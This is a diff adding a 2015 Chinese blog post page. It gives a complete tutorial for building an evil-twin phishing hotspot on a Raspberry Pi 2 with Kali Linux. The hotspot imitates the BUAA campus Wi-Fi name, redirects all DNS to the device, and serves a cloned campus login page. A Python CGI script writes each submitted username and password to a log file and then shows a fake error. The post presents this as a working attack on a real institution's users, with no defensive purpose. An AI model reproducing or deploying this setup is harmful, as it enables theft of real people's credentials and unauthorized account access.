@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+  <title>树莓派2创建钓鱼热点</title>
+  <meta name="description" content="Welcome to my blog!">
+  <meta name="author" content="Yinan Wu">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Yinan's Blog">
+  <meta name="twitter:description" content="Welcome to my blog!">
+
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Yinan's Blog">
+  <meta property="og:description" content="Welcome to my blog!">
+
+  <link rel="apple-touch-icon" sizes="57x57" href="/images/favicons/apple-touch-icon-57x57.png">
+  <link rel="apple-touch-icon" sizes="60x60" href="/images/favicons/apple-touch-icon-60x60.png">
+  <link rel="apple-touch-icon" sizes="72x72" href="/images/favicons/apple-touch-icon-72x72.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="/images/favicons/apple-touch-icon-76x76.png">
+  <link rel="apple-touch-icon" sizes="114x114" href="/images/favicons/apple-touch-icon-114x114.png">
+  <link rel="apple-touch-icon" sizes="120x120" href="/images/favicons/apple-touch-icon-120x120.png">
+  <link rel="apple-touch-icon" sizes="144x144" href="/images/favicons/apple-touch-icon-144x144.png">
+  <link rel="apple-touch-icon" sizes="152x152" href="/images/favicons/apple-touch-icon-152x152.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicons/apple-touch-icon-180x180.png">
+  <link rel="icon" type="image/png" href="/images/favicons/favicon-32x32.png" sizes="32x32">
+  <link rel="icon" type="image/png" href="/images/favicons/favicon-194x194.png" sizes="194x194">
+  <link rel="icon" type="image/png" href="/images/favicons/favicon-96x96.png" sizes="96x96">
+  <link rel="icon" type="image/png" href="/images/favicons/android-chrome-192x192.png" sizes="192x192">
+  <link rel="icon" type="image/png" href="/images/favicons/favicon-16x16.png" sizes="16x16">
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" href="/images/favicons/favicon.ico">
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="https://wuyinan0126.github.io//2015/%E6%A0%91%E8%8E%93%E6%B4%BE2%E5%88%9B%E5%BB%BA%E9%92%93%E9%B1%BC%E7%83%AD%E7%82%B9/">
+  <link rel="alternate" type="application/rss+xml" title="Yinan's Blog" href="/feed.xml">
+
+  <script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default"></script>
+</head>
+
+
+  <body>
+    <span class="mobile btn-mobile-menu">
+  <i class="icon icon-list btn-mobile-menu__icon"></i>
+  <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+</span>
+  
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+  <div class="panel-main">
+
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+        <a href="/" title="link to home of Yinan's Blog">
+          <img src="/images/profile.jpg" class="user-image" alt="My Profile Photo">
+          <h1 class="panel-cover__title panel-title">Yinan's Blog</h1>
+        </a>
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description">Welcome to my blog!</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item"><a href="/#blog" title="link to Yinan's Blog blog" class="blog-button">Blog</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item"><a href="/tags" title="link to Yinan's Blog tags" class="blog-button">Tags</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+          
+            
+              <!-- Twitter -->
+              <li class="navigation__item">
+                <a href="http://twitter.com/wuyinan0126" title="@wuyinan0126 on Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+            
+
+            
+              <!-- Facebook -->
+              <li class="navigation__item">
+                <a href="http://fb.me/wuyinan0126" title="wuyinan0126 on Facebook" target="_blank">
+                  <i class="icon icon-social-facebook"></i>
+                  <span class="label">Facebook</span>
+                </a>
+              </li>
+            
+
+            
+              <!-- LinkedIn -->
+              <li class="navigation__item">
+                <a href="https://www.linkedin.com/in/wuyinan0126" title="wuyinan0126 on LinkedIn" target="_blank">
+                  <i class="icon icon-social-linkedin"></i>
+                  <span class="label">LinkedIn</span>
+                </a>
+              </li>
+            
+
+            
+              <!-- GitHub -->
+              <li class="navigation__item">
+                <a href="https://www.github.com/wuyinan0126" title="wuyinan0126 on GitHub" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+            
+
+            
+              <!-- Email -->
+              <li class="navigation__item">
+                <a href="mailto:wuyinan0126@gmail.com" title="Email wuyinan0126@gmail.com" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+            
+
+            <!-- RSS -->
+            <!-- <li class="navigation__item">
+              <a href="/feed.xml" title="Subscribe" target="_blank">
+                <i class="icon icon-rss"></i>
+                <span class="label">RSS</span>
+              </a>
+            </li> -->
+          
+            </ul>
+          </nav>
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+  <header class="post-header">
+    <div class="post-meta">
+      <time datetime="27 Jun 2015" class="post-meta__date date">27 Jun 2015</time> &#8226; <span class="post-meta__tags">on <a href="/tags/#geek">geek</a> </span>
+    </div>
+    <h1 class="post-title">树莓派2创建钓鱼热点</h1>
+  </header>
+
+  <section class="post">
+    <p><em>使用树莓派2和无线网卡创建钓鱼热点。包括树莓派、Raspbian系统、无线网卡和Micro SD卡的介绍，以及相关软件的安装和配置</em></p>
+
+<h2 id="section">关于树莓派</h2>
+<hr />
+
+<blockquote>
+  <p>The Raspberry Pi is a tiny and affordable computer that you can use to learn programming through fun, practical projects.</p>
+</blockquote>
+
+<p><a href="https://www.raspberrypi.org/">树莓派</a>是一个小型的而且很便宜的（$35）电脑，在这个电脑上你可以通过有趣的实用的项目学习编程</p>
+
+<p>树莓派2 Model B长这样：</p>
+
+<p><img src="/assets/2015-06-27-树莓派2创建钓鱼热点-1.jpg" alt="树莓派2 Model B" title="树莓派2 Model B" /></p>
+
+<h2 id="section-1">关于系统</h2>
+<hr />
+
+<blockquote>
+  <p>Raspbian is a free operating system based on Debian optimized for the Raspberry Pi hardware.</p>
+</blockquote>
+
+<p>树莓派官方出的系统是<a href="https://www.raspbian.org/">Raspbian</a>，基于Debian并根据树莓派的硬件进行了优化</p>
+
+<p>当然其他的操作系统，如Ubuntu、Fedora都有针对树莓派的版本。我选的系统是Kali Linux，选它的原因请参考标题</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>Kali官方有针对树莓派2的版本，具体安装教程：[Kali Linux – Raspberry Pi</td>
+      <td>Kali Linux]<a href="http://docs.kali.org/kali-on-arm/install-kali-linux-arm-raspberry-pi">kali-linux</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="micro-sd">关于无线网卡和Micro SD卡</h2>
+<hr />
+
+<p>我选的无线网卡是<a href="http://item.jd.com/509932.html">EDUP EP-N8508GS黄金版 迷你USB无线网卡 树莓派专用</a>，芯片是rtl8188cus，免驱即插即用。</p>
+
+<p>选择无线网卡的时候请参考官网：<a href="http://elinux.org/RPi_USB_Wi-Fi_Adapters">RPi USB Wi-Fi Adapters</a></p>
+
+<p>我选的Micro SD卡是<a href="http://item.jd.com/679773.html">闪迪（SanDisk）32GB UHS-I 至尊高速移动MicroSDHC-TF存储卡（读速48Mb/s）</a></p>
+
+<p>选择Micro SD卡的时候请参考官网：<a href="http://elinux.org/RPi_SD_cards">RPi SD cards</a></p>
+
+<h2 id="section-2">安装和配置相关软件</h2>
+<hr />
+
+<p>假设已经按照教程安装好了系统，也插上无线网卡了，接下来就是安装必要的软件。</p>
+
+<p>连接树莓派的方式有通过显示器（需要HDMI转接头）、SSH登录、VNC连接等，因为Kali开机自动启动SSH Server，所以只要知道树莓派的IP地址，用SSH连过去就行了，Kali的默认用户名是root，登录密码是toor。</p>
+
+<p>代码前有#的表示在bash下以root身份运行的代码，没有的表示修改的文件内容。</p>
+
+<ol>
+  <li>
+    <p>修改更新源，在/etc/apt/sources.list中添加：</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code> deb http://mirrors.ustc.edu.cn/kali kali main non-free contrib
+ deb-src http://mirrors.ustc.edu.cn/kali kali main non-free contrib
+ deb http://mirrors.ustc.edu.cn/kali-security kali/updates main contrib non-free
+ deb http://mirrors.aliyun.com/kali kali main non-free contrib
+ deb-src http://mirrors.aliyun.com/kali kali main non-free contrib
+ deb http://mirrors.aliyun.com/kali-security kali/updates main contrib non-free
+</code></pre>
+    </div>
+
+    <p>然后进行更新：</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code> # apt-get update &amp;&amp; apt-get upgrade
+</code></pre>
+    </div>
+  </li>
+  <li>
+    <p>根分区扩充</p>
+
+    <p>下面链接中的文件可能有更新，请根据需要进入对应目录选择版本</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code> # wget http://archive.raspberrypi.org/debian/pool/main/r/raspi-config/raspi-config_20150131-1_all.deb
+ # wget http://http.us.debian.org/debian/pool/main/t/triggerhappy/triggerhappy_0.3.4-2_armhf.deb
+ # wget http://http.us.debian.org/debian/pool/main/l/lua5.1/lua5.1_5.1.5-7.1_armhf.deb
+ # dpkg -i triggerhappy_0.3.4-2_armhf.deb
+ # dpkg -i lua5.1_5.1.5-7.1_armhf.deb
+ # dpkg -i raspi-config_20150131-1_all.deb
+</code></pre>
+    </div>
+
+    <p>然后使用raspi-config命令进入系统设置，选择第一项Expand Filesystem扩充，当然系统设置中还有其他设置，根据需要进行设置即可。用df -lh检查文件系统大小，根分区是否为SD卡大小</p>
+  </li>
+  <li>
+    <p>安装和配置hostapd</p>
+
+    <p>hostapd的作用是提供无线共享，即配置并成功运行hostapd后，能够搜索到热点</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code> # apt-get install hostapd
+</code></pre>
+    </div>
+
+    <p>由于无线网卡支持的问题，系统安装的hostapd不支持rtl8188cus芯片，需要将hostapd替换为兼容版本：</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code> # wget http://www.daveconroy.com/wp3/wp-content/uploads/2013/07/hostapd.zip
+ # unzip hostapd.zip 
+ # sudo mv /usr/sbin/hostapd /usr/sbin/hostapd.bak
+ # sudo mv hostapd /usr/sbin/hostapd.cat
+ # sudo ln -sf /usr/sbin/hostapd.cat /usr/sbin/hostapd  
+ # sudo chmod 755 /usr/sbin/hostapd
+</code></pre>
+    </div>
+
+    <p>修改（没有的话新建）/etc/hostapd/hostapd.conf：</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code> interface=wlan0            
+ ctrl_interface=wlan0
+ ctrl_interface_group=0
+ ssid=BUAA-WiFi                # 伪热点名，例如我的是校园网的WiFi热点名            
+ channel=2                  
+ macaddr_acl=0              
+ ignore_broadcast_ssid=0    
+ driver=rtl871xdrv         
+ hw_mode=g                        
+ wmm_enabled=1
+</code></pre>
+    </div>
+
+    <p>因为是用来钓鱼的伪热点，所以不设置热点密码</p>
+
+    <p>修改/etc/default/hostapd，去掉DAEMON_CONF前的注释符号并修改为我们的配置文件路径：</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code> DAEMON_CONF="/etc/hostapd/hostapd.conf"
+</code></pre>
+    </div>
+
+    <p>启动hostapd：</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code> # service hostapd start
+</code></pre>
+    </div>
+  </li>
+  <li>
+    <p>安装和配置dnsmasq</p>
+
+    <p>dnsmasq提供的是为接进热点的设备分配IP以及进行流量引导，Kali中已经安装好dnsmasq了</p>
+
+    <p>修改（没有的话新建）/etc/dnsmasq.conf：</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code> interface=wlan0
+ bind-interfaces
+ domain=rpi
+ address=/#/192.168.126.126        # 将对所有网站的访问重定向到本机
+ dhcp-range=192.168.126.97,192.168.126.125,255.255.255.224,12h	# IP分配池和过期时间
+ dhcp-option=3,192.168.126.126 	  # Router IP
+</code></pre>
+    </div>
+
+    <p>启动dnsmasq：</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code> # dnsmasq
+</code></pre>
+    </div>
+  </li>
+  <li>
+    <p>添加iptables规则</p>
+
+    <p>修改/etc/sysctl.conf：</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code> net.ipv4.ip_forward=1
+</code></pre>
+    </div>
+
+    <p>修改/proc/sys/net/ipv4/ip_forward为1</p>
+
+    <p>添加转发规则：</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code> # sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+ # sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
+ # sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
+</code></pre>
+    </div>
+
+    <p>然后用iptables -t nat -S和iptables -S检查是否添加成功</p>
+
+    <p>为了让上面的规则在开始时自动添加，执行：</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code> # sh -c "iptables-save &gt; /etc/iptables.ipv4.nat"
+</code></pre>
+    </div>
+  </li>
+  <li>
+    <p>设置wlan0的静态IP</p>
+
+    <p>修改/etc/network/interfaces，添加：</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code> auto wlan0
+ allow-hotplug wlan0
+ iface wlan0 inet static
+         address 192.168.126.126    # 与之前dhcpd.conf填写的网关地址相同
+         netmask 255.255.255.240    # 与之前dhcpd.conf填写的子网掩码相同
+ up iptables-restore &lt; /etc/iptables.ipv4.nat
+</code></pre>
+    </div>
+  </li>
+  <li>
+    <p>安装和配置apache2</p>
+
+    <p>apache2提供的是为将重定向的流量引导到本机服务器运行的网页中，Kali中已经安装好apache2了</p>
+
+    <p>修改/etc/apache2/sites-available/default，在合适的标签下添加：</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code> &lt;VirtualHost *:80&gt;
+ ...
+ ServerName gw.buaa.edu.cn             # 伪造服务器名
+ DirectoryIndex gw.buaa.edu.cn.html    # 将默认界面改为钓鱼网站页面
+ ...
+ &lt;Directory "/usr/lib/cgi-bin"&gt;
+     AddHandler cgi-script .py         # 添加对.py的支持
+ ...
+</code></pre>
+    </div>
+
+    <p>启动apache2：</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code> # service apache2 start
+</code></pre>
+    </div>
+  </li>
+  <li>
+    <p>编写钓鱼网站</p>
+
+    <p>我要钓鱼的是学校的校园网登录网站，所以copy校园网登录的界面，修改里面的表单提交action，提交到本机服务的后台，例如我的钓鱼网站/var/www/gw.buaa.edu.cn.html：</p>
+
+    <p>编写后台处理程序，我用的是python的cgi，在/usr/lib/gci-bin下新建login.py：</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code> #!/usr/bin/python
+ #-*- encoding: utf-8 -*-
+ import cgi, cgitb
+ form = cgi.FieldStorage()
+ username = form.getvalue('username')                # 获得用户名
+ password = form.getvalue('password')                # 获得密码
+ f = open('/cat/gw.buaa.edu.cn.log', 'a')            # 注意apache是否有所写文件夹的权限！！
+ f.write("%s: %s\r\n" % (username, password))        # 将用户名和密码写入文件
+ f.close()
+ print "Content-type:text/html\r\n\r\n"              # 然后显示一个错误页面
+ print '<span class="nt">&lt;html&gt;&lt;head&gt;</span>'
+ print '<span class="nt">&lt;title&gt;</span>Error 126<span class="nt">&lt;/title&gt;</span>'
+ print '<span class="nt">&lt;/head&gt;&lt;body&gt;</span>'
+ print '<span class="nt">&lt;h1&gt;</span>Error establishing a database connection<span class="nt">&lt;/h1&gt;</span>'
+ print '<span class="nt">&lt;/body&gt;&lt;/html&gt;</span>'
+</code></pre>
+    </div>
+
+    <p>将login.py的权限设置为755，即有运行权限</p>
+  </li>
+  <li>
+    <p>将上述配置开机自启动</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code> # update-rc.d hostapd enable
+ # update-rc.d isc-dhcp-server enable
+ # update-rc.d apache2 enable	
+</code></pre>
+    </div>
+
+    <p>对于dnsmasq，需要手动编写开机启动脚本，在/etc/init.d/下新建文件dnsmasq：</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code> <span class="c">#!/bin/bash</span>
+ <span class="nb">set</span> -e
+ <span class="k">case</span> <span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span> <span class="k">in
+         </span>start<span class="p">)</span>
+                 dnsmasq&amp;
+                 <span class="p">;;</span>
+         stop<span class="p">)</span>
+                 killall -9 dnsmasq
+                 <span class="p">;;</span>
+         restart<span class="p">)</span>
+                 killall -9 dnsmasq
+                 dnsmasq&amp;
+                 <span class="p">;;</span>
+ <span class="k">esac</span>
+ <span class="nb">exit </span>0
+</code></pre>
+    </div>
+
+    <p>然后进入/etc/rc3.d/下，执行：</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code> # ln -sf /etc/init.d/dnsmasq S06dnsmasq
+</code></pre>
+    </div>
+
+    <p>S06表示启动优先级，数字越大，优先级越低，比如服务A的运行要依赖服务B，那A的数字就应该大于B的</p>
+
+    <p>最后，编辑/etc/rc.local，添加：</p>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code> service dnsmasq start
+</code></pre>
+    </div>
+  </li>
+</ol>
+
+<h2 id="section-3">测试运行</h2>
+<hr />
+
+<p>首先连接上伪热点BUAA-WIFI，然后在浏览器输入一个网址，浏览器将自动跳转到校园网登录界面：</p>
+
+<p><img src="/assets/2015-06-27-树莓派2创建钓鱼热点-2.jpg" alt="测试界面" title="测试界面" /></p>
+
+<p>当用户输入登录的用户名和密码，点击登录后，将跳转到错误页面，但是用户名和密码都已经被后台服务器记录到文件中。</p>
+
+
+
+    <div class="page_navigation">
+    
+    
+      <a class="next" href="/2016/GitHub%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">GitHub个人博客搭建 &raquo;</a>
+    
+    </div>
+
+  </section>
+  <section id="disqus_thread"></section><!-- /#disqus_thread -->
+</article>
+
+    <div id="disqus_thread"></div>
+    <script>
+
+    var disqus_shortname = 'wuyinan0126';
+
+    /**
+     *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables */
+
+    var disqus_config = function () {
+        this.page.url = 'https://wuyinan0126.github.io/2015/%E6%A0%91%E8%8E%93%E6%B4%BE2%E5%88%9B%E5%BB%BA%E9%92%93%E9%B1%BC%E7%83%AD%E7%82%B9/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = '/2015/树莓派2创建钓鱼热点'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        this.page.title = '树莓派2创建钓鱼热点';
+    };
+
+    (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        s.src = '//wuyinan0126.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function () {
+            var s = document.createElement('script'); s.async = true;
+            s.type = 'text/javascript';
+            s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+            (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+        }());
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  
+
+      </div>
+
+      <footer class="footer">
+  <span class="footer__copyright">&copy; 2016 Yinan Wu. All rights reserved.</span>
+</footer> 
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js"></script>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-84272870-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+    </div>
+  </body>
+</html>
